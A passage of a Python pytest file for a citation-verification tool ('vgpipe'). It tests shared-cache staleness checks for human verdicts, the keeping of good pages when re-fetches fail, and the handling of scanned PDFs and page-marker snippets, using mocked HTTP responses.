    from vgpipe.fetch import cache_path
    from vgpipe.models import EXTRACTOR_VERSION

    cache_path(data, s.url).write_text(
        _page(fetched_at=datetime.now(UTC), extractor_version=EXTRACTOR_VERSION)
        .model_dump_json())


def test_a_candidate_run_checks_staleness_in_the_shared_cache(tmp_path):
    """`vg judge` stamps a verdict from the shared page cache, but the check looked the page up
    under the candidate dir (data/<candidate>/cache), where it normally isn't — and a missing page
    reads as "not stale". So in every per-candidate run a re-fetch into the shared cache left
    every verdict applied: a `supports` could outlive the text it judged, and nothing said so."""
    import json

    from typer.testing import CliRunner

    from vgpipe import cli, judgments

    data, cand, s = _candidate_run(tmp_path)
    res = CliRunner().invoke(cli.app, ["judge", "q1", s.sid, "supports", "--data", str(cand)])
    assert res.exit_code == 0, res.output
    assert judgments.load(cand, "q1")[s.sid].page_fetched_at, "stamped from the shared cache"
    root = cli._cache_root(cand, None)

    claim = cli.load_claims(cand / "claims", trust_machine_fields=True)[0]
    assert judgments.apply_to(claim, cand, cache_root=root) == []
    assert claim.sources[0].verification.support == "supports"

    _refetch_shared(data, s)
    claim = cli.load_claims(cand / "claims", trust_machine_fields=True)[0]
    stale = judgments.apply_to(claim, cand, cache_root=root)
    assert len(stale) == 1 and "re-fetched" in stale[0]
    assert claim.sources[0].verification.support == "unreviewed", (
        "a verdict about the page as it was must not be applied to the page as it is")
    # Stale — and not a verifier's to close yet: the context it would be given was built from
    # the old copy, so `vg judge` refuses until `vg verify` rebuilds it. Then it waits.
    assert _unjudged(cand) == (0, 1, 0, 1)
    assert CliRunner().invoke(cli.app, ["verify", "--data", str(cand)]).exit_code == 0
    assert _unjudged(cand) == (1, 1, 1, 0)

    res = CliRunner().invoke(cli.app, ["build", "--data", str(cand)])
    assert res.exit_code == 0, res.output
    built = json.loads((cand / "out" / "claims.json").read_text())
    assert built[0]["sources"][0]["verification"]["support"] == "unreviewed"


def test_every_command_reads_verdict_pages_from_the_shared_cache_and_creates_none(
        tmp_path, monkeypatch):
    """Every command that stamps or checks a verdict must look in the shared cache — a
    candidate's own dir is where the page isn't, and a missing page reads as fresh.

    And the lookup must not create what it looks for. It went through cache_dir(), which
    mkdirs, so the first check created data/<cand>/cache/pages; `_cache_root()` then preferred
    it, and the check itself forked the candidate off the shared cache it was meant to read."""
    from typer.testing import CliRunner

    from vgpipe import cli, judgments

    data, cand, s = _candidate_run(tmp_path)
    looked_in: list[Path] = []
    real = judgments._judged_page
    monkeypatch.setattr(judgments, "_judged_page",
                        lambda root, url: looked_in.append(root) or real(root, url))
    for args in (["judge", "q1", s.sid, "supports"], ["judgments"], ["status"], ["verify"],
                 ["build"]):
        looked_in.clear()
        res = CliRunner().invoke(cli.app, [*args, "--data", str(cand)])
        assert res.exit_code == 0, (args, res.output)
        assert looked_in and set(looked_in) == {data}, (
            f"`vg {args[0]}` looked for the judged page in {set(looked_in)}")
        assert not (cand / "cache").exists(), f"`vg {args[0]}` created {cand / 'cache'}"
    assert cli._cache_root(cand, None) == data

    # and the lookup itself, against a root with no cache at all: it creates nothing, and a
    # stamped verdict with nothing to compare against reads stale, not fresh.
    why = judgments.is_stale(judgments.load(cand, "q1")[s.sid], tmp_path / "elsewhere", s)
    assert not (tmp_path / "elsewhere").exists()
    assert "not in the cache" in why


def test_an_explicit_cache_is_the_one_both_sides_use(tmp_path):
    """`--cache` moves the page cache; the stamp and the check must follow it together, or a
    verdict is stamped from one copy of a page and checked against another."""
    from typer.testing import CliRunner

    from vgpipe import cli

    data, cand, s = _candidate_run(tmp_path)
    moved = tmp_path / "moved"
    (moved / "cache").mkdir(parents=True)
    (data / "cache").rename(moved / "cache")

    res = CliRunner().invoke(cli.app, ["judge", "q1", s.sid, "supports",
                                       "--data", str(cand), "--cache", str(moved)])
    assert res.exit_code == 0, res.output
    assert _unjudged(cand, cache=moved) == (0, 1, 0, 0)
    _refetch_shared(moved, s)
    assert _unjudged(cand, cache=moved) == (0, 1, 0, 1)   # blocked on `vg verify`
    res = CliRunner().invoke(cli.app, ["verify", "--data", str(cand), "--cache", str(moved)])
    assert res.exit_code == 0, res.output
    assert _unjudged(cand, cache=moved) == (1, 1, 1, 0)


def _serve(monkeypatch, handler):
    """Route fetch()'s HTTP client through `handler`: the real fetch path, still offline.
    Returns the list of URLs requested, so a test can prove a fetch did NOT happen. Also
    starts a fresh "run" for the once-per-run kept-page warning."""
    import httpx

    hits: list[str] = []
    real = getattr(httpx.Client, "real", httpx.Client)   # a second _serve() in one test

    def _handler(request):
        hits.append(str(request.url))
        return handler(request)

    def _client(**kw):
        return real(transport=httpx.MockTransport(_handler), **kw)

    _client.real = real
    monkeypatch.setattr(fetch_mod.httpx, "Client", _client)
    monkeypatch.setattr(fetch_mod, "_warned", set())
    return hits


def _raise(request):
    import httpx

    raise httpx.ConnectError("connection reset", request=request)


def _bot_wall(request):
    import httpx

    return httpx.Response(403, html="<html><head><title>Just a moment...</title></head>"
                                    "<body><p>Checking your browser.</p></body></html>")


def _server_error(request):
    import httpx

    return httpx.Response(500, text="Internal Server Error")


def _seed_cache(root, **kw):
    """A good page, cached under an older extractor, so the next fetch() re-fetches it."""
    from vgpipe.models import EXTRACTOR_VERSION

    kw.setdefault("extractor_version", EXTRACTOR_VERSION - 1)
    page = _page(**kw)
    fetch_mod.cache_path(root, page.url).write_text(page.model_dump_json())
    return page


@pytest.mark.parametrize(("handler", "reason"), [
    (_raise, "ConnectError"),
    (_bot_wall, "HTTP 403"),
    (_server_error, "HTTP 500"),
], ids=["exception", "403-bot-wall", "500"])
def test_a_failed_refetch_never_replaces_a_good_page(tmp_path, monkeypatch, caplog, handler,
                                                    reason):
    """An extractor bump re-fetches every cached page, to improve them. For a host that now
    blocks us, writing the failure over the cached page would send every source citing it to
    fetch_failed: the bump meant to fix pages would destroy them instead, silently."""
    from vgpipe.models import EXTRACTOR_VERSION

    good = _seed_cache(tmp_path)
    hits = _serve(monkeypatch, handler)

    page = fetch_mod.fetch(good.url, tmp_path)
    assert hits == [good.url], "the older copy should still be re-fetched once"
    assert page.text == good.text and page.error is None
    assert page.extractor_version == EXTRACTOR_VERSION - 1, "served as-is, under its old version"

    on_disk = fetch_mod.load_cached(tmp_path, good.url)
    assert on_disk.text == good.text and on_disk.fetched_at == good.fetched_at
    assert on_disk.refetch_failure.extractor_version == EXTRACTOR_VERSION
    assert reason in on_disk.refetch_failure.reason

    # Loud: which URL, the new failure, and that the older copy was kept under its version.
    msg = caplog.text
    assert good.url in msg and reason in msg
    assert "kept the copy" in msg and f"v{EXTRACTOR_VERSION - 1}" in msg

    # The citation still verifies against the page it was checked on — and the row says what
    # it was checked against, since the review app and the retry loop never see the log.
    v = verify_source(src(), tmp_path, rules=RULES).verification
    assert v.status == "verified"
    assert reason in v.reason and "kept the copy" in v.reason and "older extraction" in v.reason


def test_a_miss_on_a_kept_page_blames_the_page_not_the_citation(tmp_path, monkeypatch):
    """A kept older-extraction page may lack text the current extractor would find (the
    roster-only roll calls). A miss on it must not read as a research failure alone."""
    _seed_cache(tmp_path)
    _serve(monkeypatch, _bot_wall)
    v = verify_source(src(snippet="a sentence the old extraction dropped"), tmp_path,
                      rules=RULES).verification
    assert v.status == "snippet_not_found"
    assert "snippet does not appear" in v.reason and "older extraction" in v.reason
    # `vg verify` prints only the head of a reason, so the note leads.
    assert "re-fetch failed" in v.reason[:70]


def test_a_kept_page_is_not_refetched_on_every_run(tmp_path, monkeypatch, caplog):
    """The failed attempt already happened under the current extractor. Retrying on every run
    would hammer a host that blocks us and never succeed; serve the kept copy, warn once per
    run, and leave the retry to --refresh or the next extractor bump."""
    good = _seed_cache(tmp_path)
    hits = _serve(monkeypatch, _bot_wall)

    fetch_mod.fetch(good.url, tmp_path)
    caplog.clear()
    again = fetch_mod.fetch(good.url, tmp_path)
    assert len(hits) == 1, "a kept page must not re-trigger a fetch on the next use"
    assert again.text == good.text
    assert caplog.text == "", "one warning per kept page per run, not one per citing source"

    monkeypatch.setattr(fetch_mod, "_warned", set())   # the next run
    fetch_mod.fetch(good.url, tmp_path)
    assert len(hits) == 1
    assert good.url in caplog.text and "kept the copy" in caplog.text

    fetch_mod.fetch(good.url, tmp_path, refresh=True)
    assert len(hits) == 2, "--refresh still retries"


def test_a_failed_refresh_of_a_current_page_keeps_warning(tmp_path, monkeypatch, caplog):
    """A page already on the current extractor never re-fetches on its own, so after a failed
    --refresh the recorded failure is the latest word on it: say so on later runs too."""
    from vgpipe.models import EXTRACTOR_VERSION

    good = _seed_cache(tmp_path, extractor_version=EXTRACTOR_VERSION)
    hits = _serve(monkeypatch, _server_error)
    fetch_mod.fetch(good.url, tmp_path, refresh=True)
    assert fetch_mod.load_cached(tmp_path, good.url).text == good.text

    monkeypatch.setattr(fetch_mod, "_warned", set())   # the next run
    caplog.clear()
    fetch_mod.fetch(good.url, tmp_path)
    assert len(hits) == 1
    assert "HTTP 500" in caplog.text and "older extraction" not in caplog.text


def test_vg_fetch_says_when_a_refresh_failed(tmp_path, monkeypatch, capsys):
    """`vg fetch --refresh` is the retry the warning suggests. A kept page carries its OLD
    status and text, so a failed retry would otherwise print exactly like a success."""
    import re

    from vgpipe import cli

    good = _seed_cache(tmp_path)
    _serve(monkeypatch, _bot_wall)
    cli.fetch(good.url, data=tmp_path, cache=tmp_path, refresh=True)
    out = re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out)   # rich highlights numbers
    assert "re-fetch failed (HTTP 403" in out


def test_a_thinner_good_refetch_still_replaces(tmp_path, monkeypatch):
    """Failure is objective (exception, non-2xx/3xx, no text), never the paywall heuristic:
    that flags any short titled page, and extractor fixes shorten pages. Gating on it would
    block a bump from the pages it was meant to fix, with no --refresh override."""
    import httpx

    from vgpipe.models import EXTRACTOR_VERSION

    good = _seed_cache(tmp_path)
    _serve(monkeypatch, lambda request: httpx.Response(200, html=(
        "<html><head><title>Roll call</title></head><body><p>SB 4242 passed 9-2.</p>"
        "</body></html>")))
    page = fetch_mod.fetch(good.url, tmp_path)
    assert page.paywall_suspected, "precondition: the heuristic trips on the new page"
    assert page.extractor_version == EXTRACTOR_VERSION and page.refetch_failure is None
    assert "SB 4242" in fetch_mod.load_cached(tmp_path, good.url).text


def test_the_next_extractor_bump_retries_a_kept_page(tmp_path, monkeypatch):
    import httpx

    from vgpipe.models import EXTRACTOR_VERSION, RefetchFailure

    good = _seed_cache(tmp_path, extractor_version=EXTRACTOR_VERSION - 2)
    good.refetch_failure = RefetchFailure(attempted_at=datetime.now(UTC), status=403,
                                          extractor_version=EXTRACTOR_VERSION - 1,
                                          reason="HTTP 403")
    fetch_mod.cache_path(tmp_path, good.url).write_text(good.model_dump_json())
    hits = _serve(monkeypatch, lambda request: httpx.Response(200, html=(
        f"<html><head><title>T</title></head><body><p>{PAGE_TEXT}</p></body></html>")))

    page = fetch_mod.fetch(good.url, tmp_path)
    assert hits == [good.url]
    assert page.extractor_version == EXTRACTOR_VERSION and page.refetch_failure is None
    assert fetch_mod.load_cached(tmp_path, good.url).refetch_failure is None


def test_a_failed_first_fetch_is_still_recorded(tmp_path, monkeypatch):
    """With no good page to protect, a failure is cached exactly as before."""
    hits = _serve(monkeypatch, _server_error)
    url = "https://calmatters.org/new"

    page = fetch_mod.fetch(url, tmp_path)
    assert hits == [url] and page.status == 500
    on_disk = fetch_mod.load_cached(tmp_path, url)
    assert on_disk.status == 500 and on_disk.refetch_failure is None
    assert verify_source(src(url=url), tmp_path, rules=RULES).verification.status == "fetch_failed"


def test_a_verdict_on_a_kept_page_still_applies(tmp_path, monkeypatch):
    """A kept page keeps its older extractor version and its text. A verdict stamped with that
    version is about exactly that text, so it must apply — comparing it to the CURRENT
    extractor instead made it stale on arrival, and the source could never be judged."""
    from vgpipe import judgments
    from vgpipe.models import EXTRACTOR_VERSION

    good = _seed_cache(tmp_path)
    _serve(monkeypatch, _bot_wall)
    fetch_mod.fetch(good.url, tmp_path)

    s = src()
    judgments.record(tmp_path, "q1", s.sid, "supports", "says so",
                     page_fetched_at=str(good.fetched_at),
                     extractor_version=EXTRACTOR_VERSION - 1)
    claim = Claim(question_id="q1", question="?", answer="a", sources=[s])
    assert judgments.apply_to(claim, tmp_path, cache_root=tmp_path) == []
    assert claim.sources[0].verification.support == "supports"


def test_a_refetch_with_only_page_markers_is_a_failure(tmp_path, monkeypatch):
    """An image-only PDF extracts to nothing but [[page N]] markers: truthy text, nothing a
    snippet could match. Replacing a good page with it would turn a verified citation into
    snippet_not_found, so it counts as no text."""
    import httpx

    good = _seed_cache(tmp_path)
    monkeypatch.setattr(fetch_mod, "_extract_pdf", lambda data: ("\n\n[[page 1]]\n  \n", None))
    _serve(monkeypatch, lambda request: httpx.Response(
        200, content=b"%PDF-1.4", headers={"content-type": "application/pdf"}))

    page = fetch_mod.fetch(good.url, tmp_path)
    assert page.text == good.text
    assert "no extractable text" in page.refetch_failure.reason


MARKERS_ONLY = "\n\n[[page 1]]\n  \n\n[[page 2]]\n"


def _image_only_pdf(monkeypatch):
    """Serve a 200 PDF that extracts, as a scan does, to nothing but our page markers."""
    import httpx

    monkeypatch.setattr(fetch_mod, "_extract_pdf", lambda data: (MARKERS_ONLY, None))
    return _serve(monkeypatch, lambda request: httpx.Response(
        200, content=b"%PDF-1.4", headers={"content-type": "application/pdf"}))


def _pdf_src(**kw):
    d = dict(url="https://lao.ca.gov/r.pdf", publisher="Legislative Analyst's Office",
             author="Legislative Analyst's Office", source_type="primary_document",
             snippet="The Board voted 9-2 to approve the lease")
    d.update(kw)
    return src(**d)


def test_an_image_only_pdf_is_a_missing_text_layer_not_a_bad_citation(tmp_path, monkeypatch):
    """A scanned filing serves fine and extracts to nothing but [[page N]] markers. Searching
    that finds nothing, and snippet_not_found tells the researcher a real citation to a real
    filing was fabricated — which is what pushes them to substitute a copy they can read."""
    _image_only_pdf(monkeypatch)

    s = verify_source(_pdf_src(), tmp_path, rules=RULES)
    assert s.verification.status == "human_review"
    assert "no text layer" in s.verification.reason
    assert "page` locator" in s.verification.reason
    assert "secondary_host_ack" in s.verification.reason

    # A snippet of one of our own markers can't match it either. It is refused before the page
    # is even consulted, as on any PDF.
    marker = verify_source(_pdf_src(snippet="[[page 2]]"), tmp_path, rules=RULES)
    assert marker.verification.status == "snippet_not_found"
    assert "page locator" in marker.verification.reason

    # Read-time, so `vg build` classifies the same cached page the same way, offline — and so
    # does every page cached before this existed, with no extractor bump.
    forged = _pdf_src()
    forged.verification.status = "verified"
    out = revalidate_from_cache(forged, tmp_path, rules=RULES)
    assert out.verification.status == "human_review"
    assert "no text layer" in out.verification.reason


def test_a_page_with_only_whitespace_is_not_a_missing_snippet(stub, tmp_path):
    stub["https://calmatters.org/a"] = _page(text="  \n\n  ")
    s = verify_source(src(), tmp_path, rules=RULES)
    assert s.verification.status == "fetch_failed"


def test_an_image_only_snapshot_upgrades_nothing(stub, tmp_path):
    """The archive re-check must use the same test for "is there text": a snippet matching
    one of our own page markers would otherwise verify against a scan of anything."""
    from vgpipe.verify import verify_against_archive

    url = "https://ocregister.com/x.pdf"
    snap = f"https://web.archive.org/web/2026/{url}"
    stub[url] = _gated(url)

    def archived(text, snippet):
        stub[snap] = _page(url=snap, final_url=snap, text=text, is_pdf=True,
                           content_type="application/pdf")
        s = src(url=url, publisher="OC Register", archive_url=snap, snippet=snippet)
        s.verification.status = "could_not_verify_paywall"
        return verify_against_archive(s, tmp_path).verification.status

    # The setup reaches the snapshot check: a readable snapshot does verify.
    assert archived(PDF_TEXT, "The Board voted 9-2 to approve the lease") == "verified_via_archive"
    assert archived(MARKERS_ONLY, "[[page 2]]") == "could_not_verify_paywall"


def test_a_scanned_snapshot_is_unconfirmed_not_unusable(stub, tmp_path):
    """Nothing to search in a capture is no evidence it isn't the page. "The snippet is not in
    the snapshot" would call a scan of the right document junk."""
    from vgpipe.verify import apply_archive

    records = {PAYWALLED: {"snapshot": SNAP, "error": None}}
    stub[SNAP] = _page(url=SNAP, text=MARKERS_ONLY, is_pdf=True, content_type="application/pdf")
    out = apply_archive(src(url=PAYWALLED), records, tmp_path)
    assert out.archive_status == "archive_unconfirmed"
    assert "no text layer" in out.archive_note


def test_vg_check_on_an_image_only_pdf_does_not_say_do_not_cite(tmp_path, monkeypatch):
    """Researchers self-check with `vg check`. "Not on the page. Do not cite this." about a
    scanned filing is the same false verdict, one step earlier."""
    from typer.testing import CliRunner

    from vgpipe import cli

    _image_only_pdf(monkeypatch)
    res = CliRunner().invoke(cli.app, ["check", "https://lao.ca.gov/r.pdf",
                                       "The Board voted 9-2", "--cache", str(tmp_path)])
    out = " ".join(res.output.split())
    assert res.exit_code == 0, res.output
    assert "no text layer" in out
    assert "Do not cite" not in out

    # `vg fetch` shows the markers as if they were text; it must say what they mean.
    res = CliRunner().invoke(cli.app, ["fetch", "https://lao.ca.gov/r.pdf",
                                       "--cache", str(tmp_path)])
    assert "no text layer" in " ".join(res.output.split())


def test_vg_check_triages_a_page_as_vg_verify_does(tmp_path, monkeypatch):
    """`vg check` runs the verifier's own check. A dead URL is a failure (and exits non-zero,
    so it can't read like the harmless scan case); a paywall is flagged, never failed."""
    from typer.testing import CliRunner

    from vgpipe import cli

    def check(url, snippet="The Board voted to approve"):
        res = CliRunner().invoke(cli.app, ["check", url, snippet, "--cache", str(tmp_path)])
        return res.exit_code, " ".join(res.output.split())

    _serve(monkeypatch, _raise)
    code, out = check("https://typo.example/x")
    assert code == 1 and "fetch_failed" in out and "ConnectError" in out
    assert "no text layer" not in out

    _serve(monkeypatch, _bot_wall)
    code, out = check("https://ocregister.com/x")
    assert code == 0 and "could_not_verify_paywall" in out

    # The verifier's snippet rules too: this one is on the page, and `vg verify` still fails
    # it, so `vg check` must not say OK. It needs no fetch to say so.
    hits = _serve(monkeypatch, _raise)
    cached = _page(text="The Board  voted to approve the lease.",
                   extractor_version=fetch_mod.EXTRACTOR_VERSION)
    fetch_mod.cache_path(tmp_path, cached.url).write_text(cached.model_dump_json())
    code, out = check(cached.url, "The Board  voted to approve")
    assert code == 1 and "doubled space" in out and "OK" not in out
    assert hits == []


def test_has_text_ignores_only_our_markers():
    from vgpipe.fetch import has_text

    assert not has_text(_page(text=MARKERS_ONLY))
    assert not has_text(_page(text=" \n\t "))
    assert has_text(_page(text=MARKERS_ONLY + "[[page"))   # not a marker: document text
    assert has_text(_page(text=PDF_TEXT))


# Eight pages of text: every marker up to [[page 8]] is unique, so a snippet of one would pass
# every uniqueness check there is.
MINUTES = "".join(f"\n\n[[page {i}]]\nItem {i}: the Board approved the lease for parcel {i}."
                  for i in range(1, 9))


def _minutes(**kw):
    return _page(url="https://lao.ca.gov/r.pdf", final_url="https://lao.ca.gov/r.pdf",
                 text=MINUTES, is_pdf=True, content_type="application/pdf", **kw)


def test_a_snippet_of_our_own_page_marker_does_not_verify(stub, tmp_path):
    """[[page 7]] is ours, not the document's. It is ten characters, has no line break and
    appears once in any PDF of seven or more pages, so it verified against a document that
    never contains it — and a human's Cmd-F in a PDF viewer finds nothing."""
    stub["https://lao.ca.gov/r.pdf"] = _minutes()

    # The setup reaches a match: real document text on this PDF verifies.
    ok = verify_source(_pdf_src(snippet="the Board approved the lease for parcel 7"),
                       tmp_path, rules=RULES)
    assert ok.verification.status == "verified" and ok.page == 7

    for snippet in ("[[page 7]]", "[[PAGE 7]]",
                    # spanning a page break: the end of page 6 and the start of page 7
                    "lease for parcel 6. [[page 7]] Item 7"):
        s = verify_source(_pdf_src(snippet=snippet), tmp_path, rules=RULES)
        assert s.verification.status == "snippet_not_found", snippet
        assert "page locator" in s.verification.reason, snippet
        assert "not in the document" in s.verification.reason, snippet

    # Part of a marker is no more the document's than the whole of one.
    for snippet in ("[[page 7", "page 7]]"):
        s = verify_source(_pdf_src(snippet=snippet), tmp_path, rules=RULES)
        assert s.verification.status == "snippet_not_found", snippet

    # `vg build` re-derives it offline: a claim file saying `verified` does not ride through.
    forged = _pdf_src(snippet="[[page 7]]")
    forged.verification.status = "verified"
    assert revalidate_from_cache(forged, tmp_path, rules=RULES).verification.status == \
        "human_review"


def test_a_marker_snippet_upgrades_no_snapshot(stub, tmp_path):
    """The archive re-check searches with the same locator, so a marker can't verify there."""
    from vgpipe.verify import verify_against_archive

    url = "https://ocregister.com/x.pdf"
    snap = f"https://web.archive.org/web/2026/{url}"
    stub[url] = _gated(url)
    stub[snap] = _page(url=snap, final_url=snap, text=MINUTES, is_pdf=True,
                       content_type="application/pdf")
    for snippet, want in (("the Board approved the lease for parcel 7", "verified_via_archive"),
                          ("page 7]]", "could_not_verify_paywall")):
        s = src(url=url, publisher="OC Register", archive_url=snap, snippet=snippet)
        s.verification.status = "could_not_verify_paywall"
        assert verify_against_archive(s, tmp_path).verification.status == want, snippet


def test_vg_check_refuses_a_marker_snippet(tmp_path, monkeypatch):
    from typer.testing import CliRunner

    from vgpipe import cli

    hits = _serve(monkeypatch, _raise)
    res = CliRunner().invoke(cli.app, ["check", "https://lao.ca.gov/r.pdf", "[[page 7]]",
                                       "--cache", str(tmp_path)])
    assert res.exit_code == 1
    assert "page locator" in " ".join(res.output.split())
    assert hits == []   # a snippet rule: refused before any fetch


def test_check_claim_prints_the_marker_it_refused(tmp_path, monkeypatch):
    """Rich reads "[[page 7]]" as markup. Unescaped, the researcher's gate printed the snippet
    as '[]' and the reason as "snippet contains [], a page locator" — naming nothing."""
    from typer.testing import CliRunner

    from vgpipe import cli

    _serve(monkeypatch, _raise)
    path = tmp_path / "q1.json"
    path.write_text(Claim(question_id="q1", question="?", answer="a",
                          sources=[_pdf_src(snippet="[[page 7]]")]).model_dump_json())
    res = CliRunner().invoke(cli.app, ["check-claim", str(path), "--data", str(tmp_path)])
    out = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", res.output).split())
    assert res.exit_code == 1
    assert "'[[page 7]]'" in out and "snippet contains [[page 7]], a page locator" in out


# A typed cover page with scanned schedules behind it — and a blank last page.
PARTLY_SCANNED = ("\n\n[[page 1]]\nForm 700 cover page filed by the candidate.\n\n[[page 2]]\n"
                  "\n\n[[page 3]]\n  \n\n[[page 4]]\n\n\n[[page 5]]\nSchedule notes.\n"
                  "\n\n[[page 6]]\n")


def _partly_scanned(**kw):
    kw.setdefault("text", PARTLY_SCANNED)
    return _page(url="https://lao.ca.gov/r.pdf", final_url="https://lao.ca.gov/r.pdf",
                 is_pdf=True, content_type="application/pdf", **kw)


def test_pages_without_text_is_has_text_page_by_page():
    from vgpipe.fetch import has_text, pages_without_text

    assert pages_without_text(_partly_scanned()) == [2, 3, 4, 6]
    assert pages_without_text(_page(text=MARKERS_ONLY, is_pdf=True)) == [1, 2]
    assert pages_without_text(_minutes()) == []
    # Not a PDF: its markers, if any, are document text.
    assert pages_without_text(_page(text=MARKERS_ONLY)) == []
    # One definition of "no text": a PDF has none exactly when none of its pages do.
    for text in (PARTLY_SCANNED, MARKERS_ONLY, MINUTES, PDF_TEXT):
        page = _page(text=text, is_pdf=True)
        n_pages = len(fetch_mod.PDF_PAGE_MARKER.findall(text))
        assert has_text(page) == (len(pages_without_text(page)) < n_pages), text


def test_a_quote_on_a_scanned_page_of_a_partly_scanned_pdf_is_not_fabricated(stub, tmp_path):
    """has_text() is whole-document, so a PDF with a typed cover page read as searchable and a
    real quote on a scanned page came back snippet_not_found — the false "fabricated" already
    removed for full scans, even with `page` pointing at the scan."""
    stub["https://lao.ca.gov/r.pdf"] = _partly_scanned()
    quote = "Interests in real property: 500 Main St"

    s = verify_source(_pdf_src(snippet=quote, page=3), tmp_path, rules=RULES)
    assert s.verification.status == "human_review"
    assert "PDF has no text layer on page 3" in s.verification.reason
    assert "not evidence the citation is wrong" in s.verification.reason
    # A page with no text may just be blank. Nothing mechanical can tell, so the human who
    # opens it is told what that would mean.
    assert "if the page is blank, the quote is not on it" in s.verification.reason

    # Without `page` nothing says where the quote is, and a blank page is common, so the miss
    # stands — but the reason names the pages a scan could be hiding it on.
    for page in (None, 1):
        s = verify_source(_pdf_src(snippet=quote, page=page), tmp_path, rules=RULES)
        assert s.verification.status == "snippet_not_found", page
        assert "pages 2–4, 6 have no text layer" in s.verification.reason, page
        assert "set `page`" in s.verification.reason, page

    # Text that is on the typed pages still verifies.
    ok = verify_source(_pdf_src(snippet="cover page filed by the candidate"), tmp_path,
                       rules=RULES)
    assert ok.verification.status == "verified" and ok.page == 1

    # Read-time, so `vg build` classifies the cached page the same way, offline.
    forged = _pdf_src(snippet=quote, page=3)
    forged.verification.status = "verified"
    out = revalidate_from_cache(forged, tmp_path, rules=RULES)
    assert out.verification.status == "human_review"
    assert "no text layer on page 3" in out.verification.reason


def test_a_paywall_phrase_on_a_typed_page_does_not_hide_a_scanned_one(stub, tmp_path):
    """On a PDF that served, the paywall heuristic is only a phrase in the text. A quote on a
    scanned cited page is a scan to read by eye, and an archive snapshot of it is no help."""
    stub["https://lao.ca.gov/r.pdf"] = _partly_scanned(
        text=PARTLY_SCANNED.replace("Schedule notes.", "Subscription required for the dataset."),
        paywall_suspected=True)
    s = verify_source(_pdf_src(snippet="Interests in real property", page=3), tmp_path,
                      rules=RULES)
    assert s.verification.status == "human_review"
    assert "no text layer on page 3" in s.verification.reason

    # Without `page` there is no scan to point at, so the heuristic stands as before.
    s = verify_source(_pdf_src(snippet="Interests in real property"), tmp_path, rules=RULES)
    assert s.verification.status == "could_not_verify_paywall"


def test_vg_fetch_shows_the_page_markers(tmp_path, monkeypatch):
    """Researchers pick `page` from what `vg fetch` prints. Rich read "[[page 1]]" as markup and
    printed "[]", and dropped "[sic]" from the text, so a snippet copied from it was wrong."""
    from typer.testing import CliRunner

    from vgpipe import cli

    _serve(monkeypatch, _raise)
    # Markup, an emoji shortcode, and a line longer than the 80 columns Rich wraps at.
    line = "Schedule [sic] [b] :ok: " + "approved the lease " * 6 + "notes."
    cached = _partly_scanned(extractor_version=fetch_mod.EXTRACTOR_VERSION,
                             text=PARTLY_SCANNED.replace("Schedule notes.", line))
    fetch_mod.cache_path(tmp_path, cached.url).write_text(cached.model_dump_json())
    res = CliRunner().invoke(cli.app, ["fetch", cached.url, "--cache", str(tmp_path)])
    out = re.sub(r"\x1b\[[0-9;]*m", "", res.output)
    assert res.exit_code == 0, res.output
    assert "[[page 1]]" in out and "[[page 5]]" in out
    assert line in out.splitlines()   # verbatim, and on one line
    assert "no text layer on pages 2–4, 6" in " ".join(out.split())


def test_a_long_page_list_is_capped():
    """A duplex scan with every back page blank would put 150 numbers in every miss reason."""
    from vgpipe.verify import page_list

    assert page_list([3]) == "page 3"
    assert page_list([2, 3, 4, 6]) == "pages 2–4, 6"
    assert page_list(list(range(2, 301, 2))) == "pages 2, 4, 6, 8, 10, 12, 14, 16 and 142 more"


def test_vg_check_takes_the_page_a_quote_is_on(tmp_path, monkeypatch):
    """`vg check` triages as `vg verify` does, and `vg verify` reads the source's `page` — so
    without --page a researcher's self-check would fail a quote the verifier only flags."""
    from typer.testing import CliRunner

    from vgpipe import cli

    _serve(monkeypatch, _raise)
    cached = _partly_scanned(extractor_version=fetch_mod.EXTRACTOR_VERSION)
    fetch_mod.cache_path(tmp_path, cached.url).write_text(cached.model_dump_json())

    def check(*extra):
        res = CliRunner().invoke(cli.app, ["check", cached.url, "Interests in real property",
                                           "--cache", str(tmp_path), *extra])
        return res.exit_code, " ".join(re.sub(r"\x1b\[[0-9;]*m", "", res.output).split())

    code, out = check("--page", "3")
    assert code == 0 and "no text layer on page 3" in out
    code, out = check()
    assert code == 1 and "snippet_not_found" in out and "pages 2–4, 6" in out


def test_a_partly_scanned_snapshot_is_unconfirmed_when_the_quote_is_on_a_scan(stub, tmp_path):
    """The snapshot check's own miss: "the snippet is not in the snapshot" would call a capture
    of the right document junk because the cited page is a scan."""
    from vgpipe.verify import apply_archive

    records = {PAYWALLED: {"snapshot": SNAP, "error": None}}
    stub[SNAP] = _page(url=SNAP, text=PARTLY_SCANNED, is_pdf=True,
                       content_type="application/pdf")
    out = apply_archive(src(url=PAYWALLED, snippet="Interests in real property", page=3),
                        records, tmp_path)
    assert out.archive_status == "archive_unconfirmed"
    assert "no text layer on page 3" in out.archive_note
    assert "if the page is blank, the quote is not on it" in out.archive_note   # #28 caveat

    # `page` names a page that has text, and the quote isn't on it: the capture really doesn't
    # hold it, as far as anything can tell.
    out = apply_archive(src(url=PAYWALLED, snippet="Interests in real property", page=1),
                        records, tmp_path)
    assert out.archive_status == "archive_unusable" and out.archive_url is None


def test_a_partly_scanned_snapshot_keeps_its_link_when_page_is_unset(stub, tmp_path):
    """On a paywalled row the snapshot is the human's only route to the text. A miss on a
    capture with text-less pages and no `page` was archive_unusable, which drops the link:
    the same false verdict again, in the archive path. Unconfirmed vouches for nothing, so unlike
    check_page() there is no fabricated-quote check to protect by letting the miss stand."""
    from vgpipe.verify import apply_archive, verify_against_archive

    url = "https://ocregister.com/x.pdf"
    snap = f"https://web.archive.org/web/2026/{url}"
    stub[url] = _gated(url)
    stub[snap] = _page(url=snap, final_url=snap, text=PARTLY_SCANNED, is_pdf=True,
                       content_type="application/pdf")
    s = src(url=url, publisher="OC Register", snippet="Interests in real property")
    s.verification.status = "could_not_verify_paywall"
    out = apply_archive(s, {url: {"snapshot": snap, "error": None}}, tmp_path)
    assert out.archive_status == "archive_unconfirmed"
    assert out.archive_url == snap
    assert "pages 2–4, 6 have no text layer" in out.archive_note

    # Offered, not vouched for: nothing was found, so nothing is upgraded.
    assert verify_against_archive(out, tmp_path).verification.status == \
        "could_not_verify_paywall"


def test_an_unopenable_pdf_names_its_extraction_failure(tmp_path, monkeypatch):
    """The failure used to come back in the title slot, so the review app showed the diagnosis
    as the page's name and the row read `fetch_failed: empty pdf text`."""
    import httpx

    url = "https://lao.ca.gov/r.pdf"
